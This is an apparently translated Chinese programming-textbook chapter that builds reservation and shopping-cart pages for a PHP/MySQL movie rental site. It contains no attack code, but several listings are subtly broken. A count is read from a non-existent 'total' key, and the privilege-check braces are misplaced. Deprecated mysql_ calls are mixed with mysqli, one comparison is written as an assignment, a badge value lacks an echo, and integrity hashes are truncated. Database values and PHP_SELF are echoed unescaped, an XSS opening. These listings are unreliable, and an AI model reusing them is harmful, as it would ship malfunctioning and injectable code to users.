让我们创建一个名为 isMovieReservedByUser() 的函数。它需要两个参数：$movie_id 和 $user_id。打开 queryutils.php 脚本，并添加清单 25.23 中所示的头部注释和函数。该函数查询 Movie 数据库的 reservation 表，查找包含给定 movieListing_id 和给定 user_id 的行。如果在数据库中找到一行，函数返回 true，否则返回 false。

### 清单 25.23.

```php
/**
 * Purpose:     Determines if a movie is currently reserved by a user
 *
 * Description: Given a movie id and a user id, queries to see if this user has
 *              this movie reserved. If so, true is returned, otherwise false.
 * @param        $movie_id
 * @param        $user_id
 * @return bool  True if this movie is reserved by this user, otherwise false.
 */
function isMovieReservedByUser($movie_id, $user_id)
{
    require_once('dbconnection.php');

    $ret_val = false; // Assume failure

    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
        or trigger_error(
            'Error connecting to MySQL server for ' . DB_NAME,
            E_USER_ERROR
        );

    $query = "SELECT id FROM reservation
        WHERE movieListing_id = ? AND user_id = ?";

    $result = parameterizedQuery($dbc, $query, 'ii', $movie_id, $user_id)
        or trigger_error('Error querying database movieListing',
            E_USER_ERROR);

    if (mysqli_num_rows($result) == 1)
    {
        $ret_val = true;
    }

    return $ret_val;
}
```




## 创建 NumberOfMoviesReservedByUser() 函数

让我们创建一个名为 numberOfMoviesReservedByUser() 的函数。它需要一个参数：$user_id。在清单 25.24 中添加头部和函数。该函数查询电影数据库的预订表，查找包含给定 user_id 的所有行。在第 20 行，我们使用 MySQL 的 COUNT() 函数来统计匹配行的总数。该数字表示该用户预订的电影数量。

清单 25.24.

```php
/**
 * Purpose: Determines the number of movies reserved by a user
 * Description: Given a user id, a query is made for the number of movies reserved by this user. This number is returned.
 * @param $user_id
 * @return int The number of movies reserved by this user.
 */
function numberOfMoviesReservedByUser($user_id)
{
	require_once('dbconnection.php');
	$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
	or trigger_error('Error connecting to MySQL server for' . DB_NAME, E_USER_ERROR);
	$query = "SELECT COUNT(id) FROM reservation WHERE user_id = ?";
	$result = parameterizedQuery($dbc, $query, 'i', $user_id)
	or trigger_error('Error querying database movieListing', E_USER_ERROR);
	$retval = 0;
	if (mysqli_num_rows($result) == 1)
	{
		$row = mysqli_fetch_row($result);
		$retval = $row['total'];
	}
	return $retval;
}
```

## 25. 添加预订功能

### 根据访问权限修改主页

我们需要修改主页以根据登录用户显示不同的信息。在主页上查看信息有三种不同的上下文：

- 1. 当没有人登录时。
- 2. 当用户以“admin”权限登录时。
- 3. 当用户以“user”权限登录时。

当没有人登录时，我们只想像图 25.10 那样显示电影。当具有管理员权限的用户登录时，我们希望显示垃圾桶图标以删除电影（参见图 25.11）。最后，当以用户权限登录时，可以显示购物车图标以将电影添加到购物车。购物车仅在有可预订的拷贝且用户尚未预订该电影时显示，如图 25.12 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_420_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_420_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_420_2.png)

> 购物车图标是 Font Awesome fa-shopping-cart 图标，可免费使用。
> 购物车链接将用户带到我们为预订该电影而创建的新页面。

### 从主页移除“添加电影”

当具有管理员权限的用户登录时，我们已经可以通过导航栏添加新电影的功能。打开 index.php 脚本，让我们从主页中删除添加新电影的链接，该链接位于 <h1><?= $page_title ?></h1> 行下方。打开 index.php 脚本并在清单 25.25 中进行修改。

清单 25.25.

```
1. Unchanged Lines
2.   <body>
3.   <?php
4.   require_once('navmenu.php');
5.   ?>
6.   <div class="card">
7.     <div class="card-body">
8.       <h1><?= $page_title ?></h1>
9. - Removed Line
10. -       <p class='nav-link'>If you have a movie you would like to include,
11. -               feel free to <a href='addmovie.php'> add one</a></p>
12. Unchanged Lines
13.   <?php
14.   require_once('dbconnection.php');
```

### 修改电影列表查询

由于我们只想在电影可以预订时显示预订链接，因此需要修改电影列表查询以包含 number_of_copies 和 number_reserved 字段。在数据库连接正下方，执行清单 25.26 中的修改。

清单 25.26.

```
1. Unchanged Lines
2.   ...
3.   $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
4.       or trigger_error(
5.           'Error connecting to MySQL server for' . DB_NAME,
6.           E_USER_ERROR
7.       );
8.
9. - Removed Line
10. -   $query = "SELECT id, title, image_file FROM movieListing ORDER BY title";
11. + Added Line
12. +   $query = "SELECT id, title, image_file, number_of_copies, number_reserved
13. +   FROM movieListing ORDER BY title";
14. Unchanged Lines
15.   $result = mysqli_query($dbc, $query)
16.       or trigger_error('Error querying database movieListing', E_USER_ERROR);
```

### 根据登录用户显示图标

目前，我们始终为每一行电影显示垃圾桶图标，如清单 25.27 所示。

清单 25.27.

```
<table class="table table-striped table-hover">
<thead>
<tr>
<th scope="col"><h4>Movie Titles</h4></th>
<th scope="col"></th>
<th scope="col"></th>
</tr>
</thead>
<tbody>
<?php
while ($row = mysqli_fetch_assoc($result))
{
    // ...
    echo "<tr><td><img src='' . $movie_image_file . '' class='img-thumbnail'";
    echo "'style='max-height: 75px;' alt='Movie image'></td>";
    echo "<td class='align-middle'><a class='nav-link' href='moviedetails.php?id='";
    echo $row['id'] . "'>" . $row['title'] . "</a></td>";
    echo "<td class='align-middle'><a class='nav-link' href='removemovie.php?id_to_delete='";
    echo $row['id'] . '"><i class="fas fa-trash-alt"></i></a></td></tr>';
}
?>
</tbody>
</table>
```

我们需要根据登录的用户（如果有的话）修改逻辑。如果具有用户权限的人登录，我们希望在此电影可以预订时显示购物车链接。如果具有管理员权限的人登录，我们希望显示用于删除电影的垃圾桶链接。如果没有人登录，我们将不显示任何链接。清单 25.28 概述了逻辑应是什么样的。

### 根据访问权限修改主页

清单 25.28.

```
1. while($row = mysqli_fetch_assoc($result))
2. {
3.    // ...
4.    $movie_title_row = ... // Movie row info of first two columns (image and title)
5.
6.    IF user is logged in
7.
8.        IF logged in user has admin privileges
9.
10.           $movie_title_row .= ... // Add trashcan link to remove movie for third column
11.
12.        ELSE IF logged in user has user privileges AND this movie can be reserved AND this user
13.                doesn't already have this movie reserved
14.
15.           $movie_title_row .= ... // Add shopping cart link to reserve movie for third column
16.
17.    ELSE user is not logged in
18.
19.       $movie_title_row .= ... // Add empty info for third column
20.
21.    ENDIF
22.
23.    echo $movie_title_row
24. }
```

> 此示例使用伪代码来关注逻辑。

在清单 25.29 中进行代码修改以实现此逻辑。

清单 25.29.

```
1. Unchanged Lines
2.    while($row = mysqli_fetch_assoc($result))
3.    {
4.        $movie_image_file = $row['image_file'];
5.
6.        if (empty($movie_image_file))
7.        {
8.            $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
9.        }
10.
11. - Removed Lines
12. -     echo "<tr><td><img src=" . $movie_image_file . " class='img-thumbnail'"
13. -         "style='max-height: 75px;' alt='Movie image'></td>"
14. -         "<td class='align-middle'><a class='nav-link' href='moviedetails.php?id="
15. -         $row['id'] . "'>" . $row['title'] . "</a></td>"
16. -         "<td class='align-middle'><a class='nav-link' href='removemovie.php?id_to_delete="
17. -         $row['id'] . "><i class='fas fa-trash-alt'></i></a></td></tr>";
18. + Added Lines
19. +     $movie_title_row = "<tr><td><img src=" . $movie_image_file . " class='img-thumbnail'"
20. +         "style='max-height: 75px;' alt='Movie image'></td>"
21. +         "<td class='align-middle'><a class='nav-link' href='moviedetails.php?id="
22. +         $row['id'] . "'>" . $row['title'] . "</a></td>"
23. +
24. +     if (isset($_SESSION['user_access_privileges']))
25. +     {
26. +         if ($_SESSION['user_access_privileges'] == 'admin')
27. +         {
28. +             $movie_title_row .= "<td class='align-middle'><a class='nav-link' "
29. +                 'href='removemovie.php?id_to_delete='
30. +                 . $row['id'] . "><i class='fas fa-trash-alt'></i></a></td></tr>";
31. +         }
32. +     } else if ($_SESSION['user_access_privileges'] == 'user'
33. +             && ($row['number_of_copies'] > $row['number_reserved'])
34. +             && !isMovieReservedByUser($row['id'], $_SESSION['user_id']))
35. +     {
36. +         $movie_title_row .= "<td class='align-middle'><a class='nav-link' "
37. +             "href='reservemovie.php?id_to_reserve="
38. +             . $row['id'] . "><i class='fas fa-shopping-cart'></i></a></td></tr>";
39. +     }
40. +     else // We shouldn't ever get here, but it's a good practice
41. +     {
42. +         $movie_title_row .= "<td class='align-middle'></td>";
43. +     }
44. +     }
45. + else
46. + {
47. +     $movie_title_row .= "<td class='align-middle'></td>";
48. + }
49. +
50. +     $movie_title_row .= "</tr>";
51. +
52. +     echo $movie_title_row;
53. Unchanged Lines
54.     }
```

注意在 elseif() 条件中：

```
else if ($_SESSION['user_access_privileges'] == 'user'
    && ($row['number_of_copies'] > $row['number_reserved'])
    && !isMovieReservedByUser($row['id'], $_SESSION['user_id']))
```

在显示用于预订电影的购物车链接之前，我们需要满足三个条件：

- 登录用户是否具有用户权限？
- 该影片当前的副本数量是否大于当前已预订数量？
- 用户是否已经预订了此影片（我们通过 isMovieReservedByUser() 函数进行检查）？

另外，请注意该链接引用的是我们稍后将创建的 reservemovie.php 脚本。

由于我们调用了位于 queryutils.php 脚本中的 isMovieReservedByUser() 函数，让我们在其下方紧挨着 dbconnection.php 和 movielistingfileconstants.php 的包含语句处添加对该脚本的 include。参见清单 25.30。

```
<div class="card">
    <div class="card-body">
        <h1><?= $page_title ?></h1>
        <?php
        require_once('dbconnection.php');
        require_once('movielistingfileconstants.php');
        require_once('queryutils.php');
        ?>
    </div>
</div>
```

## 重构以移除重复包含

你注意到了吗？我们应用中每个包含 queryutils.php 的脚本也都会包含 navmenu.php。navmenu.php 是一个消除重复包含的好地方，可以让 navmenu.php 来包含 queryutils.php。移除重复代码可提高可维护性。将来如果要更新所有出现该代码的位置，那将非常繁琐且容易出错。在应用中搜索所有 require_once('queryutils.php'); 语句并移除它们。以下文件中应该包含该语句：

- addmovie.php
- editmovie.php
- index.php
- login.php
- moviedetails.php
- removemovie.php
- signup.php

## 25. 添加预订功能

打开 navmenu.php 脚本，并在第一个调用 session_start() 的条件（如果会话尚未启动）正下方包含 queryutils.php（清单 25.30）。

```
```php
Unchanged Lines
<?php
$page_title = isset($page_title) ? $page_title : "";
if (session_status() == PHP_SESSION_NONE)
{
	session_start();
}
+ Added Line
+ require_once('queryutils.php');
Unchanged Lines
?>
<nav ...>
```
```

另外，请注意我们在多个已包含 navmenu.php 的脚本中重复包含了 Font Awesome 样式表。除了 navmenu.php 之外，以下文件中也应该包含该链接：

- login.php
- removemovie.php
- reservemovie.php
- unauthorizedaccess.php

找到这行代码：

```
```html
<link rel="stylesheet" href="https://use.fontawesome.com/...">
```
```

将其从上述所有脚本中移除，并在 <nav ...> 开始标签之前添加该链接，如清单 25.31 所示。

## 清单 25.31.

```
```php
1. Unchanged Lines
2. <?php
3.     $page_title = isset($page_title) ? $page_title : "";
4.
5.     if (session_status() == PHP_SESSION_NONE)
6.     {
7.         session_start();
8.     }
9.
10.    require_once('queryutils.php');
11. ?>
12. + Added Lines
13. +   <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"
14. +       integrity="sha384-50oBUH..."
15. +       crossorigin="anonymous">
16. Unchanged Lines
17.     <nav ...>
18.     ...
```
```

## 预订电影脚本

浏览和预订电影的过程应该与在在线商店中购物类似。当用户找到一件商品（在这里是指他们喜欢的电影）时，他们应该能够点击感兴趣的电影旁边的购物车图标，将其添加到购物车。见图 25.13。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_427_0.png)

我们希望他们看到类似图 25.14 的页面，以便将其添加到购物车。

首先打开 pagetitles.php，在 MR_REMOVE_MOVIE_PAGE 定义之后紧接着添加以下 MR_RESERVE_MOVIE_PAGE 定义：

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_427_1.png)

## 25. 添加预订功能

```
Unchanged Lines
    <?php
    // Page Titles
    define('MR_HOME_PAGE', 'Movie Reservations');
    ...
    define('MR_REMOVE_MOVIE_PAGE', 'Movie Reservations - Remove Movie');
+ Added Line
+     define('MR_RESERVE_MOVIE_PAGE', 'Movie Reservations - Reserve Movie');
```

预订页面是一个标准的 Bootstrap 页面，显示影片详情，并带有一个将电影添加到购物车的按钮。有两种方式可以访问此脚本。第一种是通过来自首页的 HTTP GET 请求，将电影 ID 作为查询参数。第二种是通过 HTTP POST 请求，当用户在同一页面上将电影添加到购物车时，将电影 ID 作为隐藏的表单参数。

创建一个名为 reservemovie.php 的新脚本，并添加清单 25.32 中的代码。

## 清单 25.32.

```
1. <!DOCTYPE html>
2. <?php
3. require_once('pagetitles.php');
4. $page_title = MR_RESERVE_MOVIE_PAGE;
5. ?>
6. <html>
7. <head>
8. <title><?= $page_title ?></title>
9. <link rel="stylesheet"
10. href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
11. integrity="sha384-GJzZqFGwb10TTN6wy59sFFfF1BuGJpLSa9DkKmp0DgiMDm4iYMj70zNKyBI7o6tUS"
12. crossorigin="anonymous">
13. </head>
14. <body>
15. <?php
16. require_once('navmenu.php');
17. ?>
18. <div class="card">
19. <div class="card-body">
20. <h1>Reserve Movie</h1>
21. <?php
22. require_once('dbconnection.php');
23. require_once('movieimagefileutil.php');
24.
25. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
26.     or trigger_error(
27.         'Error connecting to MySQL server for ' . DB_NAME,
28.         E_USER_ERROR
29.     );
```

## 预订电影脚本

```
30.
31.    if (isset($_POST['add_to_cart']) && isset($_POST['id'])):
32.
33.    // ...
34.
35.    elseif (isset($_GET['id_to_reserve'])):
36.    // ...
37.    else: // Unintended page link - No movie to reserve, redirect to index
38.
39.        header("Location: " . dirname($_SERVER['PHP_SELF']));
40.        exit();
41.
42.    endif;
43. ?>
44.    </div>
45.    </div>
46. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
47.    integrity="sha384-q8i/X+965DzO0rT7abKljI5tQI..."
48.    crossorigin="anonymous"></script>
49. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
50.    integrity="sha384-wHAiFfRl..."
51.    crossorigin="anonymous"></script>
52. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
53.    integrity="sha384-B0Uglyr+jN..."
54.    crossorigin="anonymous"></script>
55. </body>
56. </html>
```

这段代码是一个样板脚本，你应该看起来很熟悉。第 3、4 和 8 行设置并显示页面标题。第 16 行包含并显示导航栏。第 20 行在 <h1> 元素中显示“预订电影”。第 22–29 行包含 dbconnection.php、movieimagefileutil.php，并连接到 Movie 数据库。

第 31 行（if (isset($_POST['add_to_cart']) && isset($_POST['id']))）是用于检查用户是否按下了“添加到购物车”按钮的条件。该按钮的 name 属性名为 add_to_cart。我们将在此条件内添加代码，将这部电影添加到用户的购物车中以供预订。

第 35 行（elseif (isset($_GET['id_to_reserve']))）是用户从首页通过选择该电影的购物车图标进入页面时的条件。在此条件下，我们显示影片详情和“添加到购物车”表单按钮。请记住，对于只读操作请使用 GET。

## 25. 添加预订功能

第 37 行（else: // Unintended page link - No movie to reserve, redirect to index）是一个“兜底”条件，用于处理有人在浏览器地址栏中直接输入脚本名称的情况。如果发生这种情况，第 39 行会将用户重定向回首页。

其余代码是标准的 Bootstrap 样板脚本包含。

## 显示详情和添加到购物车的表单

当用户因选择该电影的购物车图标而首次导航到此页面时，将在此条件中执行代码：

```
elseif (isset($_GET['id_to_reserve'])):
    // ...
```

这里我们显示影片详情和一个用于将电影添加到购物车的表单按钮。影片详情的代码将与 removemovie.php 中的代码相同，只是我们不需要列出租借数量，并且只有一个按钮。

将清单 25.33 中的代码添加到 elseif (isset($_GET['id_to_reserve'])): 条件中：

## 清单 25.33.

```
1. elseif (isset($_GET['id_to_reserve'])):
2. ?>
3. <h3 class="text-success">Confirm Reservation of the Following Movie:</h3><br/>
4. <?php
5. $id = $_GET['id_to_reserve'];
6.
7. $query = "SELECT * FROM movieListing WHERE id = ?";
8.
9. $result = parameterizedQuery($dbc, $query, 'i', $id);
10.
11. if(mysqli_errno($dbc))
12. {
13.     trigger_error('Error querying database movieListing', E_USER_ERROR);
14. }
15.
16. if (mysqli_num_rows($result) == 1)
17. {
18.     $row = mysqli_fetch_assoc($result);
19.
20.     $movie_image_file = $row['image_file'];
21.
```




```php
if (empty($movie_image_file))
{
    $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
}
?>
<h1><?= $row['title'] ?></h1>
<div class="row">
    <div class="col-2">
        <img src="<?= $movie_image_file ?>" class="img-thumbnail"
             style="max-height: 200px;" alt="Movie Image">
    </div>
    <div class="col">
        <table class="table table-striped">
            <tbody>
                <tr>
                    <th scope="row">Rating</th>
                    <td><?= $row['rating'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Director</th>
                    <td><?= $row['director'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Running Time (minutes)</th>
                    <td><?= $row['running_time_in_minutes'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Genre</th>
                    <td><?= $row['genre'] ?></td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
<p>
<form method="POST" action="<?= $_SERVER['PHP_SELF'] ?>">
    <button class="btn btn-success" type="submit" name="add_to_cart">Add to Cart</button>
    <input type="hidden" name="id" value="<?= $id ?>">
</form>
<?php
    }
else
{
?>
<h3>No Movie Details :-(</h3>
    <?php
}

else: // Unintended page link - No movie to reserve, redirect back to index
```
## 25. 添加预订功能

这段代码现在应该对你来说很熟悉了。我们使用参数化查询函数根据收到的电影 ID 参数查找并显示电影详情，如果没有匹配项则显示错误消息。

> 由于我们在多个页面中看到了代码重复，很好的练习是尽快通过模块化将其重构出来。我把这个练习留给你。

### 将电影添加到购物车

一旦用户点击“Add to Cart”按钮（图 25.15），HTML POST 会路由回同一页面，因为表单的 action 属性设置为 <?= $_SERVER['PHP_SELF'] ?>。由于表单输入元素的 name 属性设置为 add_to_cart，代码将在以下条件中执行：

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_432_0.png)

```
if (isset($_POST['add_to_cart']) && isset($_POST['id'])):
```

这里我们：

- 1. 检查电影是否仍可预订
- 2. 如果仍可预订则预订电影
- 3. 在 movieListing 表中更新 number_reserved（如果已预订）。
- 4. 将电影添加到用户的购物车。
- 5. 重定向回主页。

将清单 25.34 中的代码添加到 if (isset($_POST['add_to_cart']) && isset($_POST['id'])): 条件中，我将在下面逐步讲解。

### 清单 25.34.

```
<?php
if (isset($_POST['add_to_cart']) && isset($_POST['id'])):

$movie_id = $_POST['id'];

// Query if movie is still reservable
$query = "SELECT id FROM movieListing
          WHERE id = ? AND number_of_copies - number_reserved > 0";
$result = parameterizedQuery($dbc, $query, 'i', $movie_id);
```

### 预订电影的脚本

```
if(mysql_errno($dbc))
{
	trigger_error('Error querying database movieListing', E_USER_ERROR);
}

// Reserve movie if it's reservable, update the number of reserved copies
// in movieListing for reserved movies, and add it to the cart
if (mysql_num_rows($result) == 1 && isset($_SESSION['user_id']))
{
	$user_id = $_SESSION['user_id'];
	$query = "INSERT INTO reservation (user_id, movieListing_id) VALUES (?, ?)";
	$result = parameterizedQuery($dbc, $query, 'ii', $user_id, $movie_id);
	if (mysql_errno($dbc))
	{
		trigger_error('Error querying database movieListing.reservation', E_USER_ERROR);
	}

	$query = "UPDATE movieListing SET number_reserved = number_reserved + 1 WHERE id = ?";
	$result = parameterizedQuery($dbc, $query, 'i', $movie_id);
	if (mysql_errno($dbc))
	{
		trigger_error('Error querying database movieListing.reservation', E_USER_ERROR);
	}
}

if (isset($_SESSION['cart']))
{
	array_push($_SESSION['cart'], $movie_id);
}
else
{
	$_SESSION['cart'] = [$movie_id];
}
}

header("Location: " . dirname($_SERVER['PHP_SELF']));
exit;

else if (isset($_GET['id_to_reserve']))
```

第 7–9 行查询 movieListing 数据库中的 id，并在有足够的预订副本（number_of_copies - number_reserved）时返回一行。

## 完整代码清单

### 清单 25.35.

```
1. <!DOCTYPE html>
2. <?php
3.   require_once('pagetitles.php');
4.   $page_title = MR_RESERVE_MOVIE_PAGE;
5. ?>
6. <html>
7.   <head>
8.     <title><?= $page_title ?></title>
9.     <link rel="stylesheet"
10.     href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
11.     integrity="sha384-GJzZqFQb1QbT..."
12.     crossorigin="anonymous">
13. </head>
14. <body>
15. <?php
16.   require_once('navmenu.php');
17. ?>
18.   <div class="card">
19.     <div class="card-body">
20.       <h1>Reserve Movie</h1>
21.     <?php
22.       require_once('dbconnection.php');
23.       require_once('movieimagefileutil.php');
24. 
25.       $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
26.         or trigger_error(
27.         'Error connecting to MySQL server for ' . DB_NAME,
28.         E_USER_ERROR
29.       );
30. 
31.       if (isset($_POST['add_to_cart']) && isset($_POST['id'])):
32. 
33.         $movie_id = $_POST['id'];
34. 
35.         // Query if movie is still reservable
36.         $query = "SELECT id FROM movielisting
37.                   WHERE id = ? AND number_of_copies - number_reserved > 0";
38. 
39.         $result = parameterizedQuery($dbc, $query, 'i', $movie_id);
40. 
41.         if (mysqli_errno($dbc))
42.         {
43.           trigger_error('Error querying database movielisting', E_USER_ERROR);
44.         }
```

## 25. 添加预订功能

```php
// Reserve movie if it's reservable, update the number of reserved copies
// in movielisting for reserved movies, and add it to the cart
if (mysqli_num_rows($result) == 1 && isset($_SESSION['user_id'])) {
    $user_id = $_SESSION['user_id'];
    $query = "INSERT INTO reservation (user_id, movielisting_id) VALUES (?, ?)";
    $result = parameterizedQuery($dbc, $query, 'ii', $user_id, $movie_id);
    if (mysqli_errno($dbc)) {
        trigger_error('Error querying database movielisting.reservation', E_USER_ERROR);
    }
    $query = "UPDATE movielisting SET number_reserved = number_reserved + 1 WHERE id = ?";
    $result = parameterizedQuery($dbc, $query, 'i', $movie_id);
    if (mysqli_errno($dbc)) {
        trigger_error('Error querying database movielisting.reservation', E_USER_ERROR);
    }
    if (isset($_SESSION['cart'])) {
        array_push($_SESSION['cart'], $movie_id);
    } else {
        $_SESSION['cart'] = [$movie_id];
    }
}
header("Location: " . dirname($_SERVER['PHP_SELF']));
exit;
elseif (isset($_GET['id_to_reserve'])):
?>
<h3 class="text-success">Confirm Reservation of the Following Movie:</h3><br/>
<?php
$id = $_GET['id_to_reserve'];
$query = "SELECT * FROM movielisting WHERE id = ?";
$result = parameterizedQuery($dbc, $query, 'i', $id);
if (mysqli_errno($dbc)) {
    trigger_error('Error querying database movielisting', E_USER_ERROR);
}
```

```
if (mysqli_num_rows($result) == 1)
{
    $row = mysqli_fetch_assoc($result);
    $movie_image_file = $row['image_file'];
    if (empty($movie_image_file))
    {
        $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
    }
?>
<h1><?= $row['title'] ?></h1>
<div class="row">
    <div class="col-2">
        <img src="<?= $movie_image_file ?>" class="img-thumbnail"
             style="max-height: 200px;" alt="Movie Image">
    </div>
    <div class="col">
        <table class="table table-striped">
            <tbody>
                <tr>
                    <th scope="row">Rating</th>
                    <td><?= $row['rating'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Director</th>
                    <td><?= $row['director'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Running Time (minutes)</th>
                    <td><?= $row['running_time_in_minutes'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Genre</th>
                    <td><?= $row['genre'] ?></td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
<p>
<form method="POST" action="<?= $_SERVER['PHP_SELF']; ?>">
    <button class="btn btn-success" type="submit" name="add_to_cart">Add to Cart</button>
    <input type="hidden" name="id" value="<?= $id ?>">
</form>
</p>
<?php
    }
else
{
?>
```



## 25. 添加预订功能

```
145.     <h3>No Movie Details :-</h3>
146.         <?php
147.         }
148. 
149.         else: // Unintended page link - No movie to reserve, redirect back to index
150. 
151.             header("Location: " . dirname($_SERVER['PHP_SELF']));
152.             exit();
153.         endif;
154.         ?>
155.     </div>
156. </div>
157. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
158.         integrity="sha384-q8i/X+965DzO0rT7abK0..." 
159.         crossorigin="anonymous"></script>
160. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
161.         integrity="sha384-wHAiF1qPbEpJL1lv..." 
162.         crossorigin="anonymous"></script>
163. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
164.         integrity="sha384-B0Uglyr..." 
165.         crossorigin="anonymous"></script>
166. </body>
167. </html>
```

### 将购物车添加到导航菜单

现在我们可以在购物车中预订电影并将其放入其中，让我们在导航菜单的右上角添加一个购物车图标（图 25.16）。当用户将电影添加到购物车时，我们还可以添加购物车中项目的数字表示，如图 25.17 所示。

当用户选择此购物车图标时，应用程序将导航到我们在下一节中创建的 shoppingcart.php 脚本。但首先，让我们为购物车向 navmenu.php 添加代码。

我们希望购物车图标在具有用户权限的用户登录时显示，并在购物车中有多个项目时在图标旁边显示项目数量。我们还希望此图标成为导航栏中的右侧菜单项，以将其与其他导航链接分开。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_438_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_438_1.png)

### 将购物车添加到导航菜单

首先打开 pagetitles.php 并在 MR_RESERVE_MOVIE_PAGE 定义之后添加以下 MR_SHOPPING_CART_MOVIE_PAGE 定义：

```
Unchanged Lines
<?php
    // Page Titles
    define('MR_HOME_PAGE', 'Movie Reservations');
    ...
    define('MR_RESERVE_MOVIE_PAGE', 'Reserve Movie - Remove Movie');
+ Added Line
+     define('MR_SHOPPING_CART_MOVIE_PAGE', 'Movie Reservations - Shopping Cart');
```

接下来，打开 navmenu.php 脚本。在关闭 </nav> 元素之前，添加清单 25.36 中的代码，我将在下面解释。

### 清单 25.36.

```
1.     </div>
2. </div>
3. <?php if (isset($_SESSION['user_access_privileges']))
4.     && $_SESSION['user_access_privileges'] == 'user'): ?>
5. <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
6.     <div class="nav navbar-nav ml-auto">
7.         <a class="nav-item nav-link<?php $page_title = MR_SHOPPING_CART_MOVIE_PAGE ? ' active' : '';?>"
8.             href="shoppingcart.php"><i class="fas fa-shopping-cart"></i>
9.             <span class="badge badge-light">
10.                 <?php isset($_SESSION['cart']) ? count($_SESSION['cart']) : '' ?>
11.             </span>
12.         </a>
13.     </div>
14. </div>
15. <?php endif; ?>
16. </nav>
```

第 3 行是检查用户是否已登录并具有用户访问权限的条件。

第 5 行在现有导航栏的右侧创建一个新的导航栏组。

第 6 行设置此组中的任何导航项右对齐。

## 25. 添加预订功能

第 7–12 行显示带有链接到 `shoppingcart.php` 的购物车图标。此外，请注意三元操作，如果 `$_SESSION['cart']` 存在，则会添加一个显示购物车中项目数量的徽章。它被设置为购物车图标右侧的 span。

### 为购物车添加脚本

现在我们可以将电影放入购物车，我们需要创建一个网页来管理我们的购物车。我们需要能够从购物车中删除项目并预订购物车中的所有电影。

假设我们已将主页上图 25.18 所示的轮廓电影添加到购物车中。

当我们像图 25.19 中那样在导航栏右上角选择购物车图标时，用户应转到看起来像图 25.20 的 `shoppingcart.php` 页面。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_440_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_440_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_440_2.png)

### 为购物车添加脚本

请注意，每部电影都可以从购物车中删除，因此假设我们想像图 25.21 那样删除一部电影。该电影将从购物车和预订表中删除。我们剩下这些电影（图 25.22），可以通过按“预订电影”按钮来预订它们。

> 请注意，我们购物车中的电影数量已更新。

当用户选择“预订电影”按钮时，用户购物车将被清空。然后，应用程序显示主页（图 25.23）。您可以看到购物车为空，并且显示了一个代表电影放映机的新图标（图 25.24）。我们将在更新导航栏时稍后添加它，它将链接到一个页面，允许我们退回已预订的电影。

> 与电影在添加到购物车时立即被预订这一事实相关的设计缺陷存在。本章末尾，我将解释该应用程序的缺陷以及需要考虑的潜在设计解决方案。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_441_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_441_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_441_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_441_3.png)

## 25. 添加预订功能

### 创建购物车页面

首先打开 pagetitles.php 并在 MR_RESERVE_MOVIE_PAGE 定义之后添加以下 MR_SHOPPING_CART_MOVIE_PAGE 定义：

```
Unchanged Lines
<?php
// Page Titles
define('MR_HOME_PAGE', 'Movie Reservations');
...
define('MR_RESERVE_MOVIE_PAGE', 'Movie Reservations - Reserve Movie');
+ Added Line
+     define('MR_SHOPPING_CART_MOVIE_PAGE', 'Movie Reservations - Shopping Cart');
```

购物车页面是一个标准的 Bootstrap 页面。创建一个名为 shoppingcart.php 的新脚本并添加清单 25.37 中的代码。

### 清单 25.37.

```
1. <!DOCTYPE html>
2. <?php
3. require_once('pagetitles.php');
4. $page_title = MR_SHOPPING_CART_MOVIE_PAGE;
5. ?>
6. <html>
7. <head>
8. <title><?= $page_title ?></title>
9. <link rel="stylesheet"
10. href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
11. integrity="sha384-GJzZqFGwbIQTTN7wy59ff1BuCjLpsaSa9DkKmp0DgiMDm4iVMj70gZKybYt70dI4S"
12. crossorigin="anonymous">
13. </head>
14. <body>
15. <?php
16. require_once('navmenu.php');
17. ?>
18. <div class="card">
19. <div class="card-body">
